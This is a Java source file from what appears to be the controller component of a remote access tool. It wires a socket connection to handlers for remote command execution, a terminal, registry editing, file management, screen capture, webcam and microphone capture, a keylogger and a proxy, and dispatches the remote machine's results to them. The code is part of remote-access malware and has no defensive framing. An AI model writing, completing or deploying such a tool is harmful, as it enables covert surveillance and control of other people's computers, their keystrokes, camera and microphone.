package javanet.client;

import java.awt.Toolkit;
import java.io.IOException;
import java.net.Socket;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.Logger;
import javanet.IOUtils;
import javanet.Utils;
import javax.swing.JButton;

/**
 *
 * @author Jackson McClintock
 */
public class ClientUtils {
    
    int screenx = Toolkit.getDefaultToolkit().getScreenSize().width;
    int screeny = Toolkit.getDefaultToolkit().getScreenSize().height;
    Socket socket = null;
    ClientExecute execute = new ClientExecute(this);
    ClientCreateFile create_file = new ClientCreateFile(this);
    ClientCreateDir create_dir = new ClientCreateDir(this);
    ClientFileManager file_manager = new ClientFileManager(this);
    ClientRegedit regedit = new ClientRegedit(this);
    ClientScreen screen = new ClientScreen(this);
    ClientTaskManager task_manager = new ClientTaskManager(this);
    ClientTerminal terminal = new ClientTerminal(this);
    ClientWebcam webcam = new ClientWebcam(this);
    ClientMic mic = new ClientMic(this);
    ClientKeylogger keylogger = new ClientKeylogger(this);
    ClientProxy proxy = new ClientProxy(this);
    ClientDelete delete = new ClientDelete(this);
    ClientRename rename = new ClientRename(this);
    ClientUtils utils = this;
    HashMap<String, Object> functions = new HashMap<>();
    IOUtils io = null;
    final int SLEEP_INTERVAL = 10;
    Client client;
    JButton connect_button;
    
    public ClientUtils(Client client, JButton connect_button, Socket socket){
        this.client= client;
        this.connect_button = connect_button;
        functions.put("execute", execute);
        functions.put("create_file", create_file);
        functions.put("create_dir", create_dir);
        functions.put("file_manager", file_manager);
        functions.put("regedit", regedit);
        functions.put("screen", screen);
        functions.put("task_manager", task_manager);
        functions.put("terminal", terminal);
        functions.put("webcam", webcam);
        functions.put("mic", mic);
        functions.put("keylogger", keylogger);
        functions.put("proxy", proxy);
        functions.put("delete", delete);
        functions.put("rename", rename);
        for(int i = 0; i < functions.size(); i++){
            ClientFunction temp_function = ((ClientFunction) functions.values().toArray()[i]);
            for(int j = 1; j < temp_function.command_list.length; j++){
                functions.put(temp_function.command_list[j], temp_function);
            }
        }
        this.socket = socket;
        try {
            io = new IOUtils(socket);
        } catch (IOException ex) {
            Logger.getLogger(ClientUtils.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    public void executeResult(String full_command){
        String command;
        if(!full_command.contains(":_:_:")){
            command = full_command.substring(0, full_command.indexOf(":^:^:"));
        }else{
            command = full_command.substring(0, full_command.indexOf(":_:_:"));
        }
        System.out.println("Client Recieve: " + command);
        ClientFunction function = (ClientFunction) functions.get(command);
        function.notifyRecieved(Utils.splitToStringArray(full_command));
    }
    public void resultListener(){
        for(;;){
            try {
                String result = Utils.commandListener(io);
                new Thread(){
                    @Override
                    public void run(){
                        executeResult(result);
                    }
                }.start();
            } catch (IOException ex) {
                client.remove(socket.getInetAddress(), connect_button);
            }
        }
    }
}
